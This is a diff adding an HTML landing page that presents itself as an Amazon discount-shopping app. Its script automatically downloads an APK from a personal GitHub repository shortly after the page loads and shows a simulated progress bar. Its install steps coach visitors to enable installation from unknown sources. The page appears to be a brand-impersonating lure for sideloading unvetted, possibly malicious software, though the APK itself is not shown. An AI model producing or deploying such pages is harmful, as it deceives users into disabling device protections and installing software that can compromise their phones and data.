@@ -1,0 +1,558 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Amazon Discount Shopping</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: -apple-system, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+      background: #eaeef2;
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 20px;
+      margin: 0;
+    }
+
+    .container {
+      max-width: 700px;
+      width: 100%;
+      background: #ffffff;
+      border-radius: 8px;
+      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.08);
+      overflow: hidden;
+    }
+
+    /* ----- Amazon header with logo ----- */
+    .header {
+      background: #131a22;
+      padding: 14px 24px;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .header .logo-img {
+      height: 36px;
+      width: auto;
+      display: block;
+      flex-shrink: 0;
+    }
+
+    .header .app-name {
+      color: #ffffff;
+      font-size: 16px;
+      font-weight: 500;
+      letter-spacing: 0.2px;
+      margin-left: 4px;
+    }
+
+    .header .app-name span {
+      color: #ff9900;
+      font-weight: 700;
+    }
+
+    /* ----- Main content ----- */
+    .main {
+      padding: 32px 28px 28px;
+    }
+
+    .main h1 {
+      font-size: 26px;
+      font-weight: 600;
+      color: #111;
+      margin-bottom: 4px;
+    }
+
+    .main .subhead {
+      font-size: 16px;
+      color: #565959;
+      margin-bottom: 20px;
+      line-height: 1.5;
+    }
+
+    .main .offer-tag {
+      display: inline-block;
+      background: #febd69;
+      color: #111;
+      font-size: 13px;
+      font-weight: 700;
+      padding: 4px 14px;
+      border-radius: 20px;
+      margin-bottom: 20px;
+    }
+
+    /* ----- Download card ----- */
+    .download-card {
+      background: #f7f8fa;
+      border-radius: 8px;
+      padding: 24px 24px 20px;
+      border: 1px solid #e3e6e8;
+      margin-bottom: 28px;
+    }
+
+    .download-card .status-row {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      font-size: 15px;
+      color: #111;
+      font-weight: 500;
+    }
+
+    .download-card .status-row .dot {
+      width: 10px;
+      height: 10px;
+      border-radius: 50%;
+      background: #00a85a;
+      animation: pulse 1.6s infinite;
+    }
+
+    @keyframes pulse {
+      0% { opacity: 0.4; transform: scale(0.9); }
+      50% { opacity: 1; transform: scale(1.1); }
+      100% { opacity: 0.4; transform: scale(0.9); }
+    }
+
+    .download-card .file-name {
+      font-size: 13px;
+      color: #565959;
+      background: #eaedf0;
+      padding: 4px 12px;
+      border-radius: 30px;
+      display: inline-block;
+      margin-top: 8px;
+      font-family: 'SF Mono', monospace;
+    }
+
+    .download-card .progress {
+      margin-top: 16px;
+      height: 6px;
+      background: #d5d9dd;
+      border-radius: 4px;
+      overflow: hidden;
+      max-width: 300px;
+    }
+
+    .download-card .progress .bar {
+      height: 100%;
+      width: 0%;
+      background: #ff9900;
+      border-radius: 4px;
+      transition: width 0.3s;
+    }
+
+    .download-card .progress-label {
+      font-size: 13px;
+      color: #888c8e;
+      margin-top: 6px;
+    }
+
+    .download-card .actions {
+      margin-top: 18px;
+      display: flex;
+      flex-wrap: wrap;
+      gap: 10px;
+      align-items: center;
+    }
+
+    .btn-primary {
+      background: #ff9900;
+      border: none;
+      color: #111;
+      font-weight: 700;
+      font-size: 16px;
+      padding: 12px 32px;
+      border-radius: 30px;
+      cursor: pointer;
+      transition: background 0.15s;
+      box-shadow: 0 2px 8px rgba(255, 153, 0, 0.3);
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    .btn-primary:hover {
+      background: #e68a00;
+    }
+
+    .btn-primary:active {
+      transform: scale(0.97);
+    }
+
+    .btn-link {
+      background: transparent;
+      border: none;
+      color: #007185;
+      font-size: 14px;
+      cursor: pointer;
+      text-decoration: underline dotted;
+      padding: 6px 12px;
+    }
+
+    .btn-link:hover {
+      color: #c7511f;
+    }
+
+    .auto-note {
+      font-size: 13px;
+      color: #888c8e;
+      margin-top: 14px;
+      padding-top: 12px;
+      border-top: 1px solid #eaedf0;
+    }
+
+    /* ----- Instructions ----- */
+    .instructions h2 {
+      font-size: 18px;
+      font-weight: 600;
+      color: #111;
+      margin-bottom: 14px;
+    }
+
+    .step {
+      display: flex;
+      gap: 14px;
+      margin-bottom: 14px;
+      padding: 12px 14px;
+      background: #fafbfc;
+      border-radius: 8px;
+      border-left: 3px solid #ff9900;
+    }
+
+    .step .num {
+      font-weight: 700;
+      color: #ff9900;
+      font-size: 16px;
+      min-width: 28px;
+    }
+
+    .step .content strong {
+      display: block;
+      font-size: 15px;
+      color: #111;
+    }
+
+    .step .content p {
+      font-size: 14px;
+      color: #565959;
+      margin: 2px 0 0;
+      line-height: 1.5;
+    }
+
+    .step .content .extra {
+      font-size: 13px;
+      color: #888c8e;
+      margin-top: 4px;
+    }
+
+    .device-tips {
+      background: #f0f2f4;
+      border-radius: 8px;
+      padding: 12px 16px;
+      margin-top: 18px;
+      font-size: 13px;
+      color: #333;
+    }
+
+    .device-tips strong {
+      display: block;
+      margin-bottom: 4px;
+    }
+
+    .device-tips ul {
+      margin: 4px 0 0 16px;
+      padding: 0;
+    }
+
+    /* ----- Footer ----- */
+    .footer {
+      background: #f7f8fa;
+      padding: 12px 24px;
+      border-top: 1px solid #e3e6e8;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      font-size: 13px;
+      color: #888c8e;
+      flex-wrap: wrap;
+      gap: 6px;
+    }
+
+    .footer a {
+      color: #007185;
+      text-decoration: none;
+      margin-left: 16px;
+    }
+
+    .footer a:hover {
+      text-decoration: underline;
+      color: #c7511f;
+    }
+
+    /* ----- Responsive ----- */
+    @media (max-width: 540px) {
+      .main {
+        padding: 24px 16px 20px;
+      }
+      .header {
+        padding: 12px 16px;
+        flex-wrap: wrap;
+      }
+      .header .app-name {
+        font-size: 14px;
+      }
+      .main h1 {
+        font-size: 22px;
+      }
+      .download-card {
+        padding: 18px 16px;
+      }
+      .btn-primary {
+        font-size: 15px;
+        padding: 10px 24px;
+        width: 100%;
+        justify-content: center;
+      }
+      .step {
+        padding: 10px 12px;
+      }
+      .footer {
+        flex-direction: column;
+        text-align: center;
+        padding: 12px 16px;
+      }
+      .footer a {
+        margin: 0 8px;
+      }
+    }
+  </style>
+</head>
+<body>
+
+<div class="container">
+
+  <!-- Header with your logo -->
+  <div class="header">
+    <img class="logo-img" src="https://totallyquestions.com/wp-content/uploads/2026/08/logo.png" alt="Amazon Discount Shopping logo" onerror="this.style.display='none'">
+    <span class="app-name">Amazon <span>Discount Shopping</span></span>
+  </div>
+
+  <!-- Main -->
+  <div class="main">
+    <h1>Smart shopping, bigger savings</h1>
+    <p class="subhead">Compare prices, track deals, and get exclusive discounts — all in one lightweight app.</p>
+    <span class="offer-tag">🔥 Up to 70% off + flash sales</span>
+
+    <!-- Download card -->
+    <div class="download-card">
+      <div class="status-row">
+        <span class="dot"></span>
+        <span id="statusText">Initializing…</span>
+      </div>
+      <div class="file-name" id="fileNameDisplay">amazondiscountshopping.apk</div>
+
+      <div class="progress">
+        <div class="bar" id="progressBar" style="width:0%"></div>
+      </div>
+      <div class="progress-label" id="progressLabel">0%</div>
+
+      <div class="actions">
+        <button class="btn-primary" id="downloadBtn">
+          <span>⬇</span> Download APK
+        </button>
+        <button class="btn-link" id="retryBtn" style="display:none;">↻ Retry</button>
+      </div>
+
+      <div class="auto-note">
+        ⚡ Download will start automatically in a few seconds
+      </div>
+    </div>
+
+    <!-- Instructions -->
+    <div class="instructions">
+      <h2>📲 How to install</h2>
+
+      <div class="step">
+        <div class="num">1</div>
+        <div class="content">
+          <strong>Download the APK</strong>
+          <p>Tap the <strong>Download APK</strong> button above. The file will be saved to your device.</p>
+        </div>
+      </div>
+
+      <div class="step">
+        <div class="num">2</div>
+        <div class="content">
+          <strong>Allow installation from unknown sources</strong>
+          <p>Go to <strong>Settings → Security</strong> (or <strong>Privacy</strong>) and enable <strong>Install unknown apps</strong> for your browser or file manager.</p>
+          <div class="extra">⚠️ This is required to install APKs.</div>
+        </div>
+      </div>
+
+      <div class="step">
+        <div class="num">3</div>
+        <div class="content">
+          <strong>Open the APK</strong>
+          <p>Find the file in your <strong>Downloads</strong> folder or notification panel. Tap it and select <strong>Install</strong>.</p>
+        </div>
+      </div>
+
+      <div class="step">
+        <div class="num">4</div>
+        <div class="content">
+          <strong>Launch &amp; enjoy</strong>
+          <p>After installation, open the app from your home screen. Start shopping with exclusive discounts!</p>
+        </div>
+      </div>
+
+      <div class="device-tips">
+        <strong>📌 Device-specific tips</strong>
+        <ul>
+          <li><strong>Samsung</strong>: Settings → Biometrics and security → Install unknown apps</li>
+          <li><strong>Xiaomi</strong>: Settings → Apps → Manage apps → Install unknown apps</li>
+          <li><strong>Android 13+</strong>: You'll see a prompt to allow installation from your browser — tap <strong>Allow</strong>.</li>
+        </ul>
+      </div>
+    </div>
+  </div>
+
+  <!-- Footer -->
+  <div class="footer">
+    <span>© 2026 Amazon Discount Shopping</span>
+    <div>
+      <a href="#" id="directLink">Direct download</a>
+      <a href="#" onclick="window.location.reload();">Refresh</a>
+    </div>
+  </div>
+</div>
+
+<script>
+  (function() {
+    const APK_URL = 'https://github.com/moni2552/amazondiscountshopping/raw/refs/heads/main/amazondiscountshopping.apk';
+    const FILE_NAME = 'amazondiscountshopping.apk';
+
+    const statusText = document.getElementById('statusText');
+    const progressBar = document.getElementById('progressBar');
+    const progressLabel = document.getElementById('progressLabel');
+    const downloadBtn = document.getElementById('downloadBtn');
+    const retryBtn = document.getElementById('retryBtn');
+    const directLink = document.getElementById('directLink');
+
+    let started = false;
+    let autoTimer = null;
+
+    function setStatus(msg, pct) {
+      statusText.textContent = msg;
+      if (pct !== undefined) {
+        const val = Math.min(100, Math.max(0, pct));
+        progressBar.style.width = val + '%';
+        progressLabel.textContent = Math.round(val) + '%';
+      }
+    }
+
+    function triggerDownload() {
+      if (started) return;
+      started = true;
+
+      setStatus('⏳ Starting download…', 5);
+
+      // Create invisible anchor
+      const a = document.createElement('a');
+      a.href = APK_URL;
+      a.download = FILE_NAME;
+      a.style.display = 'none';
+      document.body.appendChild(a);
+      a.click();
+
+      // Simulate progress
+      let p = 10;
+      const interval = setInterval(() => {
+        if (p < 85) {
+          p += Math.random() * 5 + 2;
+          setStatus('⬇ Downloading…', Math.min(p, 85));
+        }
+      }, 400);
+
+      // After ~4s show "started"
+      setTimeout(() => {
+        clearInterval(interval);
+        setStatus('✅ Download started! Check your notifications.', 100);
+        downloadBtn.textContent = '⬇ Download again';
+        downloadBtn.onclick = function() {
+          started = false;
+          setStatus('🔄 Retrying…', 0);
+          setTimeout(triggerDownload, 300);
+        };
+        retryBtn.style.display = 'none';
+      }, 4000);
+
+      // Fallback direct link
+      directLink.href = APK_URL;
+      directLink.target = '_blank';
+    }
+
+    function retryDownload() {
+      started = false;
+      retryBtn.style.display = 'none';
+      setStatus('🔄 Retrying…', 0);
+      progressBar.style.width = '0%';
+      progressLabel.textContent = '0%';
+      downloadBtn.textContent = '⬇ Download APK';
+      downloadBtn.onclick = triggerDownload;
+      setTimeout(triggerDownload, 500);
+    }
+
+    // Auto-start after page load
+    function autoStart() {
+      setStatus('⏳ Ready…', 0);
+      autoTimer = setTimeout(() => {
+        triggerDownload();
+      }, 1200);
+    }
+
+    downloadBtn.addEventListener('click', function(e) {
+      e.preventDefault();
+      if (autoTimer) {
+        clearTimeout(autoTimer);
+        autoTimer = null;
+      }
+      triggerDownload();
+    });
+
+    retryBtn.addEventListener('click', function(e) {
+      e.preventDefault();
+      retryDownload();
+    });
+
+    directLink.addEventListener('click', function(e) {
+      e.preventDefault();
+      window.open(APK_URL, '_blank');
+    });
+
+    // Start
+    autoStart();
+
+    // On pageshow, reset if not started
+    window.addEventListener('pageshow', function() {
+      if (!started) {
+        setStatus('⏳ Ready…', 0);
+        progressBar.style.width = '0%';
+        progressLabel.textContent = '0%';
+        if (autoTimer) clearTimeout(autoTimer);
+        autoTimer = setTimeout(triggerDownload, 1500);
+      }
+    });
+  })();
+</script>
+
+</body>
+</html>
